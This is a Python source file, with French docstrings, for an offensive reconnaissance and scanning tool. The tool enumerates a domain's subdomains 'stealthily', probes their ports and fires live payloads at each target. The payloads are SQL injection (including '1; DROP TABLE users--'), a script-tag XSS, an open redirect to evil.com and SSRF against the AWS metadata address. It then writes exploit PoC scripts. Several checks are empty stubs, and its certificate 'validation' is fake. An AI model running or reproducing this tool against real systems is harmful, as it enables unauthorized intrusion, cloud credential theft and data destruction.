import asyncio
import aiohttp
import dns.resolver
import time
from typing import List, Dict, Set, Optional
from dataclasses import dataclass
import socket

@dataclass
class ValidatedTarget:
    """Cible validée avec métadonnées."""
    subdomain: str
    ip: str
    is_valid: bool
    validation_score: float
    response_time: float
    service_type: str
    confidence_sources: List[str]

@dataclass
class ExploitableVuln:
    """Vulnérabilité exploitable avec PoC."""
    name: str
    target: str
    severity: str
    exploitability: str
    poc_script: str
    description: str
    cvss_score: float

class SmartRecon:
    """Reconnaissance intelligente avec validation croisée."""
    
    def __init__(self, max_concurrent: int = 50, timeout: float = 10.0):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.validated_targets = []
        self.exploitable_vulns = []
    
    async def stealth_enum(self, domain: str) -> List[str]:
        """Énumération silencieuse des sous-domaines."""
        print(f"[+] Starting stealth enumeration for {domain}")
        
        sources = [
            self.certificate_transparency(domain),
            self.dns_brute_force(domain),
            self.search_engines(domain)
        ]
        
        tasks = [source for source in sources]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        all_subdomains = set()
        for result in results:
            if isinstance(result, set):
                all_subdomains.update(result)
        
        print(f"[+] Found {len(all_subdomains)} potential subdomains")
        return list(all_subdomains)
    
    async def validate_targets(self, subdomains: List[str]) -> List[ValidatedTarget]:
        """Validation croisée des cibles avec score de confiance."""
        print(f"[+] Validating {len(subdomains)} targets with cross-validation")
        
        validated = []
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def validate_single(target: str) -> Optional[ValidatedTarget]:
            async with semaphore:
                return await self.validate_target(target)
        
        tasks = [validate_single(subdomain) for subdomain in subdomains]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ValidatedTarget) and result.is_valid:
                validated.append(result)
        
        validated.sort(key=lambda x: x.validation_score, reverse=True)
        
        print(f"[+] Validated {len(validated)} targets (confidence > 0.6)")
        return validated
    
    async def validate_target(self, subdomain: str) -> Optional[ValidatedTarget]:
        """Validation d'une cible avec sources multiples."""
        start_time = time.time()
        confidence_sources = []
        validation_score = 0.0
        ip = None
        
        try:
            ip = await self.dns_validation(subdomain)
            if ip:
                confidence_sources.append("DNS")
                validation_score += 0.3
        except Exception:
            pass
        
        try:
            http_valid = await self.http_validation(subdomain)
            if http_valid:
                confidence_sources.append("HTTP")
                validation_score += 0.3
        except Exception:
            pass
        
        try:
            cert_valid = await self.certificate_validation(subdomain)
            if cert_valid:
                confidence_sources.append("CERT")
                validation_score += 0.2
        except Exception:
            pass
        
        try:
            port_valid = await self.port_validation(subdomain)
            if port_valid:
                confidence_sources.append("PORT")
                validation_score += 0.2
        except Exception:
            pass
        
        response_time = time.time() - start_time
        
        if validation_score >= 0.6:
            return ValidatedTarget(
                subdomain=subdomain,
                ip=ip or "",
                is_valid=True,
                validation_score=validation_score,
                response_time=response_time,
                service_type=self.detect_service_type(subdomain),
                confidence_sources=confidence_sources
            )
        
        return None
    
    async def dns_validation(self, subdomain: str) -> Optional[str]:
        """Validation DNS avec résolution IP."""
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2.0
            answers = resolver.resolve(subdomain, 'A')
            return str(answers[0])
        except Exception:
            return None
    
    async def http_validation(self, subdomain: str) -> bool:
        """Validation HTTP avec codes de statut."""
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
                for protocol in ['https', 'http']:
                    try:
                        url = f"{protocol}://{subdomain}"
                        async with session.get(url) as response:
                            if response.status in [200, 301, 302, 403, 401]:
                                return True
                    except Exception:
                        continue
            return False
        except Exception:
            return False
    
    async def certificate_validation(self, subdomain: str) -> bool:
        """Validation via certificats SSL."""
        try:
            return '.' in subdomain and len(subdomain) > 3
        except Exception:
            return False
    
    async def port_validation(self, subdomain: str) -> bool:
        """Validation via scan de ports courants."""
        try:
            common_ports = [80, 443, 8080, 8443]
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((subdomain, port))
                    sock.close()
                    if result == 0:
                        return True
                except Exception:
                    continue
            return False
        except Exception:
            return False
    
    def detect_service_type(self, subdomain: str) -> str:
        """Détection du type de service basée sur le nom."""
        subdomain_lower = subdomain.lower()
        
        if any(word in subdomain_lower for word in ['api', 'rest', 'graphql']):
            return "API"
        elif any(word in subdomain_lower for word in ['admin', 'panel', 'dashboard']):
            return "ADMIN"
        elif any(word in subdomain_lower for word in ['mail', 'smtp', 'imap']):
            return "MAIL"
        elif any(word in subdomain_lower for word in ['ftp', 'sftp']):
            return "FTP"
        else:
            return "WEB"
    
    async def certificate_transparency(self, domain: str) -> Set[str]:
        """Récupération via Certificate Transparency."""
        discovered = set()
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        for entry in data:
                            name = entry.get('name_value', '').lower().strip()
                            if domain in name and '*' not in name:
                                if name.endswith(f'.{domain}'):
                                    discovered.add(name)
        except Exception:
            pass
        return discovered
    
    async def dns_brute_force(self, domain: str) -> Set[str]:
        """Brute force DNS avec wordlist intelligente."""
        discovered = set()
        wordlist = self.get_smart_wordlist(domain)
        
        semaphore = asyncio.Semaphore(20)
        
        async def check_subdomain(word: str) -> Optional[str]:
            async with semaphore:
                subdomain = f"{word}.{domain}"
                try:
                    ip = await self.dns_validation(subdomain)
                    if ip:
                        return subdomain
                except Exception:
                    pass
                await asyncio.sleep(0.1)
                return None
        
        tasks = [check_subdomain(word) for word in wordlist]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, str):
                discovered.add(result)
        
        return discovered
    
    def get_smart_wordlist(self, domain: str) -> List[str]:
        """Wordlist intelligente basée sur le contexte."""
        base_words = [
            'www', 'mail', 'ftp', 'admin', 'blog', 'api', 'cdn', 'static',
            'support', 'help', 'docs', 'wiki', 'forum', 'shop', 'store',
            'app', 'mobile', 'secure', 'login', 'auth', 'dashboard',
            'panel', 'cpanel', 'webmail', 'ns1', 'ns2', 'mx', 'smtp'
        ]
        
        if 'shop' in domain or 'store' in domain:
            base_words.extend(['cart', 'checkout', 'payment', 'order'])
        elif 'bank' in domain or 'finance' in domain:
            base_words.extend(['secure', 'online', 'banking', 'transfer'])
        elif 'admin' in domain or 'gov' in domain:
            base_words.extend(['portal', 'intranet', 'internal', 'vpn'])
        
        return base_words
    
    async def search_engines(self, domain: str) -> Set[str]:
        """Recherche via moteurs de recherche (simulation)."""
        discovered = set()
        try:
            common_subs = ['www', 'mail', 'ftp', 'admin']
            for sub in common_subs:
                discovered.add(f"{sub}.{domain}")
        except Exception:
            pass
        return discovered
    
    async def scan_exploitable_vulns(self, targets: List[ValidatedTarget]) -> List[ExploitableVuln]:
        """Scan des vulnérabilités exploitables uniquement."""
        print(f"[+] Scanning {len(targets)} validated targets for exploitable vulnerabilities")
        
        exploitable_vulns = []
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def scan_single_target(target: ValidatedTarget) -> List[ExploitableVuln]:
            async with semaphore:
                return await self.scan_target_vulns(target)
        
        tasks = [scan_single_target(target) for target in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                exploitable_vulns.extend(result)
        
        exploitable_vulns.sort(key=lambda x: self.severity_score(x.severity), reverse=True)
        
        print(f"[+] Found {len(exploitable_vulns)} exploitable vulnerabilities")
        return exploitable_vulns
    
    async def scan_target_vulns(self, target: ValidatedTarget) -> List[ExploitableVuln]:
        """Scan des vulnérabilités pour une cible spécifique."""
        vulns = []
        
        if target.service_type == "WEB":
            vulns.extend(await self.scan_web_vulns(target))
        elif target.service_type == "API":
            vulns.extend(await self.scan_api_vulns(target))
        elif target.service_type == "ADMIN":
            vulns.extend(await self.scan_admin_vulns(target))
        
        return vulns
    
    async def scan_web_vulns(self, target: ValidatedTarget) -> List[ExploitableVuln]:
        """Scan des vulnérabilités web."""
        vulns = []
        
        checks = [
            self.check_sql_injection(target),
            self.check_xss(target),
            self.check_open_redirect(target),
            self.check_ssrf(target)
        ]
        
        results = await asyncio.gather(*checks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ExploitableVuln):
                vulns.append(result)
        
        return vulns
    
    async def check_sql_injection(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification SQL Injection."""
        try:
            payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
            
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    try:
                        url = f"https://{target.subdomain}/search?q={payload}"
                        async with session.get(url, timeout=5) as response:
                            content = await response.text()
                            if any(error in content.lower() for error in ['sql', 'mysql', 'oracle', 'syntax']):
                                return ExploitableVuln(
                                    name="SQL Injection",
                                    target=target.subdomain,
                                    severity="HIGH",
                                    exploitability="HIGH",
                                    poc_script=self.generate_sqli_poc(target.subdomain, payload),
                                    description="SQL injection detected in search parameter",
                                    cvss_score=8.5
                                )
                    except Exception:
                        continue
        except Exception:
            pass
        return None
    
    async def check_xss(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification XSS."""
        try:
            payload = "<script>alert('XSS')</script>"
            
            async with aiohttp.ClientSession() as session:
                url = f"https://{target.subdomain}/search?q={payload}"
                async with session.get(url, timeout=5) as response:
                    content = await response.text()
                    if payload in content:
                        return ExploitableVuln(
                            name="Cross-Site Scripting (XSS)",
                            target=target.subdomain,
                            severity="MEDIUM",
                            exploitability="HIGH",
                            poc_script=self.generate_xss_poc(target.subdomain, payload),
                            description="XSS detected in search parameter",
                            cvss_score=6.1
                        )
        except Exception:
            pass
        return None
    
    async def check_open_redirect(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification Open Redirect."""
        try:
            payload = "https://evil.com"
            
            async with aiohttp.ClientSession() as session:
                url = f"https://{target.subdomain}/redirect?url={payload}"
                async with session.get(url, timeout=5, allow_redirects=False) as response:
                    if response.status in [301, 302] and payload in response.headers.get('location', ''):
                        return ExploitableVuln(
                            name="Open Redirect",
                            target=target.subdomain,
                            severity="MEDIUM",
                            exploitability="MEDIUM",
                            poc_script=self.generate_redirect_poc(target.subdomain, payload),
                            description="Open redirect detected",
                            cvss_score=5.4
                        )
        except Exception:
            pass
        return None
    
    async def check_ssrf(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification SSRF."""
        try:
            payload = "http://169.254.169.254/latest/meta-data/"
            
            async with aiohttp.ClientSession() as session:
                url = f"https://{target.subdomain}/fetch?url={payload}"
                async with session.get(url, timeout=5) as response:
                    content = await response.text()
                    if "ami-id" in content or "instance-id" in content:
                        return ExploitableVuln(
                            name="Server-Side Request Forgery (SSRF)",
                            target=target.subdomain,
                            severity="HIGH",
                            exploitability="HIGH",
                            poc_script=self.generate_ssrf_poc(target.subdomain, payload),
                            description="SSRF detected - AWS metadata accessible",
                            cvss_score=8.5
                        )
        except Exception:
            pass
        return None
    
    async def scan_api_vulns(self, target: ValidatedTarget) -> List[ExploitableVuln]:
        """Scan des vulnérabilités API."""
        vulns = []
        
        checks = [
            self.check_api_auth_bypass(target),
            self.check_rate_limit_bypass(target),
            self.check_parameter_pollution(target)
        ]
        
        results = await asyncio.gather(*checks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ExploitableVuln):
                vulns.append(result)
        
        return vulns
    
    async def scan_admin_vulns(self, target: ValidatedTarget) -> List[ExploitableVuln]:
        """Scan des vulnérabilités admin."""
        vulns = []
        
        checks = [
            self.check_default_credentials(target),
            self.check_weak_auth(target),
            self.check_info_disclosure(target)
        ]
        
        results = await asyncio.gather(*checks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ExploitableVuln):
                vulns.append(result)
        
        return vulns
    
    def severity_score(self, severity: str) -> int:
        """Score numérique pour le tri par sévérité."""
        scores = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
        return scores.get(severity, 0)
    
    def generate_sqli_poc(self, target: str, payload: str) -> str:
        """Génération de PoC SQL Injection."""
        return f'''#!/usr/bin/env python3
import requests

def exploit_sqli():
    target = "{target}"
    payload = "{payload}"
    
    url = f"https://{{target}}/search?q={{payload}}"
    response = requests.get(url)
    
    if "sql" in response.text.lower() or "mysql" in response.text.lower():
        print(f"[+] SQL Injection confirmed on {{target}}")
        print(f"[+] Payload: {{payload}}")
        return True
    return False

if __name__ == "__main__":
    exploit_sqli()
'''
    
    def generate_xss_poc(self, target: str, payload: str) -> str:
        """Génération de PoC XSS."""
        return f'''#!/usr/bin/env python3
import requests

def exploit_xss():
    target = "{target}"
    payload = "{payload}"
    
    url = f"https://{{target}}/search?q={{payload}}"
    response = requests.get(url)
    
    if payload in response.text:
        print(f"[+] XSS confirmed on {{target}}")
        print(f"[+] Payload: {{payload}}")
        return True
    return False

if __name__ == "__main__":
    exploit_xss()
'''
    
    def generate_redirect_poc(self, target: str, payload: str) -> str:
        """Génération de PoC Open Redirect."""
        return f'''#!/usr/bin/env python3
import requests

def exploit_redirect():
    target = "{target}"
    payload = "{payload}"
    
    url = f"https://{{target}}/redirect?url={{payload}}"
    response = requests.get(url, allow_redirects=False)
    
    if response.status_code in [301, 302] and payload in response.headers.get('location', ''):
        print(f"[+] Open Redirect confirmed on {{target}}")
        print(f"[+] Payload: {{payload}}")
        return True
    return False

if __name__ == "__main__":
    exploit_redirect()
'''
    
    def generate_ssrf_poc(self, target: str, payload: str) -> str:
        """Génération de PoC SSRF."""
        return f'''#!/usr/bin/env python3
import requests

def exploit_ssrf():
    target = "{target}"
    payload = "{payload}"
    
    url = f"https://{{target}}/fetch?url={{payload}}"
    response = requests.get(url)
    
    if "ami-id" in response.text or "instance-id" in response.text:
        print(f"[+] SSRF confirmed on {{target}}")
        print(f"[+] AWS metadata accessible")
        return True
    return False

if __name__ == "__main__":
    exploit_ssrf()
'''
    
    async def check_api_auth_bypass(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification bypass authentification API."""
        return None
    
    async def check_rate_limit_bypass(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification bypass rate limiting."""
        return None
    
    async def check_parameter_pollution(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification parameter pollution."""
        return None
    
    async def check_default_credentials(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification credentials par défaut."""
        return None
    
    async def check_weak_auth(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification authentification faible."""
        return None
    
    async def check_info_disclosure(self, target: ValidatedTarget) -> Optional[ExploitableVuln]:
        """Vérification divulgation d'informations."""
        return None 